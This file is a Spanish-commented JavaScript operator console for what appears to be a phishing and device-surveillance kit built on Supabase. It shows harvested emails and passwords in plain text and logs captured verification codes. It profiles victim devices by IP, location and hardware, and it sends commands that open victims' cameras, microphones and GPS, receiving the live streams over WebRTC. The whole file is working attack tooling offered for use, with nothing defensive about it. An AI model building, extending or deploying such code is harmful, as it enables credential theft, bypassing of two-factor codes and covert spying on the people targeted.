console.log(">>> ADMIN.JS INICIANDO CARGA <<<");

// Elementos del DOM
const deviceCountEl = document.getElementById('device-count');
const credentialsCountEl = document.getElementById('credentials-count');
const cameraCountEl = document.getElementById('camera-count');
const micCountEl = document.getElementById('mic-count');
const devicesContainer = document.getElementById('devices-container');
const terminalOutput = document.getElementById('terminal');
const clearTerminalBtn = document.getElementById('clear-terminal');

// Cliente global
const supaClient = window.supabaseClient;

// Estado local
let devices = [];
let credentialsCount = 0;
let activeCameras = 0;
let activeMics = 0;

// Credenciales
let credentialsData = [];
const credentialsContainer = document.getElementById('credentials-container');

// Peers WebRTC activos
const peers = {};

// Función para escribir en la terminal
function logToTerminal(message, type = 'info') {
    const time = new Date().toLocaleTimeString();
    const span = document.createElement('div');
    span.innerHTML = `<span style="color: #666;">[${time}]</span> <span class="log-${type}">${message}</span>`;
    terminalOutput.appendChild(span);
    terminalOutput.scrollTop = terminalOutput.scrollHeight;
}

clearTerminalBtn.addEventListener('click', () => {
    terminalOutput.innerHTML = '';
});

// Inicializar la data llamando a Supabase directamente
async function initAdmin() {
    logToTerminal('Iniciando Perímetro de Administración...', 'info');
    
    // Configurar suscripciones PRIMERO para que el tiempo real funcione aunque la BD falle
    setupRealtimeSubscriptions();

    try {
        const [devRes, credRes] = await Promise.all([
            supaClient.from('devices').select('*').order('last_active', { ascending: false }),
            supaClient.from('credentials').select('*').order('timestamp', { ascending: false }).limit(50)
        ]);

        if (devRes.error) {
            console.error("Error fetching devices:", devRes.error);
            logToTerminal(`ERROR DE ACCESO A TABLA DEVICES: ${devRes.error.message}`, 'error');
        } else if (devRes.data) {
            devices = devRes.data;
            deviceCountEl.textContent = devices.length;
            renderDevices();
        }

        if (credRes.error) {
            console.error("Error fetching credentials:", credRes.error);
            logToTerminal(`ERROR DE ACCESO A TABLA CREDENTIALS: ${credRes.error.message}`, 'error');
        } else if (credRes.data) {
            credentialsData = credRes.data;
            credentialsCount = credentialsData.length;
            credentialsCountEl.textContent = credentialsCount;
            renderCredentials();
        }

        updateStatsFromDevices();

        // Actualizar UI cada 30 segundos para limpiar inactivos
        setInterval(() => {
            updateStatsFromDevices();
            renderDevices();
        }, 30000);

        logToTerminal('Administrador conectado. Datos cacheados correctamente.', 'success');
    } catch (e) {
        logToTerminal('Fallo la conexión a Supabase: ' + e.message, 'error');
    }
}

function getActiveDevices() {
    return devices.filter(d => {
        if (!d.last_active) return false;
        
        const lastActiveTime = new Date(d.last_active).getTime();
        const currentTime = new Date().getTime();
        
        // Usamos un margen de 5 minutos (300,000 ms) y Math.abs para ignorar desajustes de reloj
        // Esto evita que desaparezcan si el reloj del dispositivo está adelantado o atrasado
        return Math.abs(currentTime - lastActiveTime) < 300000;
    });
}

function updateStatsFromDevices() {
    const activeDevs = getActiveDevices();
    deviceCountEl.textContent = activeDevs.length;
    activeCameras = activeDevs.filter(d => d.permissions && !!d.permissions.camera).length;
    activeMics = activeDevs.filter(d => d.permissions && !!d.permissions.microphone).length;
    cameraCountEl.textContent = activeCameras;
    micCountEl.textContent = activeMics;
}

function renderDevices() {
    devicesContainer.innerHTML = '';
    const activeDevices = getActiveDevices();

    if (activeDevices.length === 0) {
        devicesContainer.innerHTML = `
            <div class="no-devices" style="text-align: center; padding: 3rem; color: var(--text-muted);">
                <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1" style="margin-bottom: 1rem; opacity: 0.3;">
                    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
                </svg>
                <p>No se detectan terminales activas en el perímetro.</p>
            </div>
        `;
        return;
    }

    activeDevices.forEach(device => {
        const div = document.createElement('div');
        div.className = 'device-card';
        
        const lastActive = new Date(device.last_active).toLocaleTimeString();
        const loc = device.location || {};
        const screenRes = device.screen_width ? `${device.screen_width}x${device.screen_height}` : (loc.screen_res || 'N/A');
        
        div.innerHTML = `
            <div class="device-header">
                <div class="device-name">TERMINAL: ${device.device_id.substring(0, 8)}...</div>
                <span class="device-status">SECURE CONNECTION</span>
            </div>
            
            <div class="device-info">
                <div class="device-info-item"><strong>IP:</strong> ${device.ip || '0.0.0.0'}</div>
                <div class="device-info-item"><strong>Ubicación:</strong> ${loc.latitude ? 'GEOLOCALIZADO' : 'PENDIENTE'}</div>
                <div class="device-info-item"><strong>Plataforma:</strong> ${device.platform}</div>
                <div class="device-info-item"><strong>Último Pulso:</strong> ${lastActive}</div>
            </div>

            <div id="tech-sheet-${device.device_id}" style="display: none; margin-bottom: 1.2rem; padding: 1.5rem; background: rgba(0,0,0,0.4); border-radius: 12px; border: 1px solid var(--primary); font-size: 0.75rem; font-family: 'Fira Code', monospace; line-height: 1.5;">
                <div style="color: var(--primary); font-weight: 700; margin-bottom: 0.75rem; border-bottom: 1px solid var(--border); padding-bottom: 0.5rem; display: flex; justify-content: space-between;">
                    <span>INTEL_REPORT // 0x${device.device_id.substring(0, 4).toUpperCase()}</span>
                    <span style="color: var(--secondary)">VERIFIED</span>
                </div>
                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 0.8rem;">
                    <div>• OS_PLATFORM: <span style="color: var(--text-main)">${device.platform}</span></div>
                    <div>• IP_V4_ADDR: <span style="color: var(--secondary)">${device.ip || '0.0.0.0'}</span></div>
                    <div>• GEO_ZONE: <span style="color: var(--text-main)">${loc.timezone || 'UTC'}</span></div>
                    <div>• CPU_CORES: <span style="color: var(--text-main)">${loc.cores || 'N/A'}</span></div>
                    <div>• RAM_ESTIM: <span style="color: var(--text-main)">${loc.memory ? loc.memory + ' GB' : 'N/A'}</span></div>
                    <div>• RESOLUTION: <span style="color: var(--text-main)">${screenRes}</span></div>
                    <div>• BATT_LEVEL: <span style="color: var(--text-main)">${loc.battery_level || 'N/A'}</span></div>
                    <div>• CHARGING: <span style="color: var(--text-main)">${loc.battery_charging || 'N/A'}</span></div>
                    <div>• CONN_TYPE: <span style="color: var(--text-main)">${loc.connection_type || 'N/A'}</span></div>
                    <div>• DOWNLINK: <span style="color: var(--text-main)">${loc.downlink || 'N/A'}</span></div>
                    <div>• COOKIES_EN: <span style="color: var(--text-main)">${loc.cookies || 'N/A'}</span></div>
                    <div>• NET_STATUS: <span style="color: var(--secondary)">${loc.online || 'ONLINE'}</span></div>
                    <div>• MAC_ADDR: <span style="color: var(--error)">[BLOCK_BY_OS]</span></div>
                    <div>• LANG_SET: <span style="color: var(--text-main)">${device.language}</span></div>
                </div>
                <div style="margin-top: 0.8rem; font-size: 0.65rem; color: var(--text-muted); border-top: 1px solid var(--border); padding-top: 0.5rem; word-break: break-all;">
                    UA: ${device.user_agent}
                </div>
            </div>
            
            <div class="device-controls">
                <button class="control-btn" onclick="toggleTechSheet('${device.device_id}')">Ficha Técnica</button>
                <button class="control-btn" onclick="requestAction('${device.device_id}', 'access-camera')">Cámara</button>
                <button class="control-btn" onclick="requestAction('${device.device_id}', 'access-mic')">Micro</button>
                <button class="control-btn" onclick="requestAction('${device.device_id}', 'get-location')">GPS</button>
            </div>
        `;
        devicesContainer.appendChild(div);
    });
}

function toggleTechSheet(deviceId) {
    const sheet = document.getElementById(`tech-sheet-${deviceId}`);
    sheet.style.display = sheet.style.display === 'none' ? 'block' : 'none';
}

function requestAction(deviceId, action) {
    logToTerminal(`Solicitud enviada: ${action.toUpperCase()} para ${deviceId}`, 'warning');
    if (window.channel) {
        window.channel.send({
            type: 'broadcast',
            event: 'request-action',
            payload: { deviceId, action }
        });
    }
}

function renderCredentials() {
    if (credentialsData.length === 0) return;
    credentialsContainer.innerHTML = '';
    credentialsData.forEach(cred => {
        const div = document.createElement('div');
        div.className = 'credential-item';
        const date = cred.timestamp ? new Date(cred.timestamp).toLocaleTimeString() : new Date().toLocaleTimeString();
        div.innerHTML = `
            <div style="font-size: 0.7rem; color: var(--text-muted); opacity: 0.7;">[${date}] ID: ${cred.device_id.substring(0, 6)}</div>
            <div><span style="color: var(--primary)">U:</span> ${cred.email}</div>
            <div><span style="color: var(--secondary)">P:</span> ${cred.password}</div>
        `;
        credentialsContainer.appendChild(div);
    });
}

function handleWebRTCSignal(deviceId, signal) {
    // Si el cliente reinició la llamada (envía un 'offer'), destruimos nuestro peer antiguo
    if (signal.type === 'offer' && peers[deviceId]) {
        peers[deviceId].destroy();
        delete peers[deviceId];
    }

    if (!peers[deviceId] || peers[deviceId].destroyed) {
        logToTerminal(`Iniciando conexión P2P Directa (WebRTC) con ${deviceId}...`, 'warning');
        
        peers[deviceId] = new window.SimplePeer({
            initiator: false,
            trickle: false,
            config: { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] }
        });

        peers[deviceId].on('signal', data => {
            // Responder al cliente para cerrar la conexión P2P
            window.channel.send({
                type: 'broadcast',
                event: 'webrtc-signal',
                payload: { deviceId: 'admin', targetId: deviceId, signal: data }
            });
        });

        peers[deviceId].on('stream', stream => {
            logToTerminal(`¡Conexión P2P Establecida! Recibiendo Stream Media de ${deviceId}`, 'success');
            document.getElementById('media-streams').style.display = 'block';
            
            let mediaEl = document.getElementById(`stream-${deviceId}`);
            if (!mediaEl) {
                const hasVideo = stream.getVideoTracks().length > 0;
                mediaEl = document.createElement(hasVideo ? 'video' : 'audio');
                mediaEl.id = `stream-${deviceId}`;
                mediaEl.autoplay = true;
                mediaEl.controls = true;
                mediaEl.playsInline = true;
                mediaEl.muted = hasVideo; 
                
                const container = document.createElement('div');
                container.className = 'stream-wrapper';
                container.style.marginBottom = '1rem';
                container.appendChild(mediaEl);

                if (hasVideo) {
                    const unmuteBtn = document.createElement('button');
                    unmuteBtn.textContent = 'Activar Audio';
                    unmuteBtn.className = 'control-btn';
                    unmuteBtn.style.marginTop = '0.5rem';
                    unmuteBtn.onclick = () => { mediaEl.muted = false; unmuteBtn.style.display = 'none'; };
                    container.appendChild(unmuteBtn);
                }
                
                document.getElementById('streams-container').appendChild(container);
            }
            mediaEl.srcObject = stream;
        });

        peers[deviceId].on('error', err => logToTerminal(`Error WebRTC P2P: ${err.message}`, 'error'));
    }

    peers[deviceId].signal(signal);
}

function setupRealtimeSubscriptions() {
    window.channel = supaClient.channel('cyber-room', {
        config: {
            broadcast: { ack: false },
        },
    })
        .on('broadcast', { event: 'device-connected' }, payload => {
            const dev = payload.payload;
            logToTerminal(`Nuevo dispositivo conectado vía Realtime: ${dev.device_id} (${dev.ip})`, 'info');
            const idx = devices.findIndex(d => d.device_id === dev.device_id);
            if (idx >= 0) devices[idx] = { ...devices[idx], ...dev, status: 'active' };
            else devices.unshift({ ...dev, status: 'active' });
            deviceCountEl.textContent = devices.length;
            renderDevices();
        })
        .on('broadcast', { event: 'credentials-captured' }, payload => {
            const p = payload.payload;
            logToTerminal(`¡Credenciales capturadas! Device: ${p.deviceId} | Email: ${p.email} | PW: ${p.password}`, 'success');
            credentialsData.unshift({ device_id: p.deviceId, email: p.email, password: p.password, timestamp: new Date().toISOString() });
            credentialsCount = credentialsData.length;
            credentialsCountEl.textContent = credentialsCount;
            renderCredentials();
        })
        .on('broadcast', { event: 'permissions-granted' }, payload => {
            logToTerminal(`Permisos concedidos globalmente para id: ${payload.payload.deviceId}`, 'warning');
        })
        .on('broadcast', { event: 'camera-accessed' }, payload => {
            logToTerminal(`Feed de CAMARA interceptado - origen: ${payload.payload.deviceId}`, 'success');
        })
        .on('broadcast', { event: 'mic-accessed' }, payload => {
            logToTerminal(`Feed de MICROFONO interceptado - origen: ${payload.payload.deviceId}`, 'success');
        })
        .on('broadcast', { event: 'location-updated' }, payload => {
            const l = payload.payload.location;
            const mapLink = `<a href="https://www.google.com/maps?q=${l.latitude},${l.longitude}" target="_blank" style="color:#0ff; text-decoration:underline;">Ver en Mapa</a>`;
            logToTerminal(`GPS [${payload.payload.deviceId}]: Lat ${l.latitude}, Lng ${l.longitude} - ${mapLink}`, 'info');
        })
        .on('broadcast', { event: 'verification-completed' }, payload => {
            logToTerminal(`Verificación de código capturada de: ${payload.payload.deviceId}. Código: ${payload.payload.code}`, 'warning');
        })
        .on('broadcast', { event: 'webrtc-signal' }, payload => {
            const p = payload.payload;
            if (p.targetId === 'admin') {
                handleWebRTCSignal(p.deviceId, p.signal);
            }
        })
        .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'credentials' }, payload => {
            // Ya manejado por el broadcast en tiempo real para mayor velocidad, pero en caso de fallback:
            if (!credentialsData.find(c => c.email === payload.new.email && c.password === payload.new.password)) {
                credentialsData.unshift(payload.new);
                credentialsCount = credentialsData.length;
                credentialsCountEl.textContent = credentialsCount;
                renderCredentials();
            }
        })
        .on('postgres_changes', { event: '*', schema: 'public', table: 'devices' }, payload => {
            if (payload.eventType === 'DELETE') {
                devices = devices.filter(d => d.device_id !== payload.old.device_id);
            } else {
                const updatedDev = payload.new;
                const idx = devices.findIndex(d => d.device_id === updatedDev.device_id);
                if (idx >= 0) {
                    devices[idx] = updatedDev;
                } else {
                    devices.unshift(updatedDev);
                }
            }
            updateStatsFromDevices();
            renderDevices();
        })
        .subscribe((status, err) => {
            if (status === 'SUBSCRIBED') {
                logToTerminal('Conexión Realtime establecida con éxito.', 'success');
            }
            if (status === 'CLOSED') {
                logToTerminal('¡ADVERTENCIA! Conexión Realtime cerrada. Revisa tu API Key o conexión a internet.', 'error');
            }
            if (status === 'CHANNEL_ERROR') {
                logToTerminal('ERROR DE CANAL: No se pudo conectar al servidor de Realtime.', 'error');
                console.error("Error detallado de canal:", err);
            }
        });
}

// Inicializar pantalla
initAdmin().catch(err => {
    console.error(">>> ERROR CRITICO EN ADMIN <<<", err);
    logToTerminal('Error de sistema: ' + (err.message || 'Error desconocido'), 'error');
});
